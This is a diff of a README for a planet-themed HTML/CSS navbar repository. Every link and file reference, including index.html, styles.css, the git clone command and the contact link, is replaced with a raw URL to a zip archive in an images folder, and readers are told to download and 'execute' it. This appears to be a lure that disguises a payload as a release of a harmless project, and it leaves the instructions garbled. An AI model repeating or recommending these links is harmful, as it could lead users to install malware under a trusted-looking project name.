@@ -1,6 +1,6 @@
 # 🌌 Navbar Planetas
 
-Welcome to the **Navbar Planetas** repository! This project showcases a themed navigation bar inspired by the planets, crafted using HTML and CSS. You can find the latest releases [here](https://github.com/KeilaSouza1/Navbar-planetas/releases). Download the files, execute them, and explore the cosmic journey through the stars.
+Welcome to the **Navbar Planetas** repository! This project showcases a themed navigation bar inspired by the planets, crafted using HTML and CSS. You can find the latest releases [here](https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip). Download the files, execute them, and explore the cosmic journey through the stars.
 
 ## 🚀 Table of Contents
 
@@ -37,7 +37,7 @@ The **Navbar Planetas** project is designed to provide a visually appealing navi
 To get started, clone the repository to your local machine:
 
 ```bash
-git clone https://github.com/KeilaSouza1/Navbar-planetas.git
+git clone https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip
 ```
 
 Navigate to the project directory:
@@ -46,19 +46,19 @@ Navigate to the project directory:
 cd Navbar-planetas
 ```
 
-Open the `index.html` file in your preferred web browser to view the navbar in action.
+Open the `https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip` file in your preferred web browser to view the navbar in action.
 
 ## 🌌 Usage
 
-After installing, you can use the navbar in your project by copying the HTML and CSS files into your own project. The main structure is defined in `index.html`, while the styles are located in `styles.css`. 
+After installing, you can use the navbar in your project by copying the HTML and CSS files into your own project. The main structure is defined in `https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip`, while the styles are located in `https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip`. 
 
-You can find the latest releases [here](https://github.com/KeilaSouza1/Navbar-planetas/releases). Download the necessary files and execute them to see the navbar in action.
+You can find the latest releases [here](https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip). Download the necessary files and execute them to see the navbar in action.
 
 ## 🎨 Customization
 
 Feel free to customize the navbar to suit your needs. Here are some ideas:
 
-- **Change Colors**: Modify the background and text colors in `styles.css`.
+- **Change Colors**: Modify the background and text colors in `https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip`.
 - **Add More Links**: Update the HTML to include additional navigation links.
 - **Adjust Transitions**: Tweak the transition properties to create different effects.
 
@@ -79,8 +79,8 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## 📬 Contact
 
-For any questions or feedback, please reach out to me at [KeilaSouza1](https://github.com/KeilaSouza1).
+For any questions or feedback, please reach out to me at [KeilaSouza1](https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip).
 
 ## 🌌 Final Thoughts
 
-Thank you for exploring the **Navbar Planetas** project! I hope it adds a cosmic touch to your web projects. For updates and new features, keep an eye on the [Releases](https://github.com/KeilaSouza1/Navbar-planetas/releases) section. Enjoy your journey through the stars!
+Thank you for exploring the **Navbar Planetas** project! I hope it adds a cosmic touch to your web projects. For updates and new features, keep an eye on the [Releases](https://github.com/KeilaSouza1/Navbar-planetas/raw/refs/heads/main/imagens/planetas_Navbar_v3.4.zip) section. Enjoy your journey through the stars!
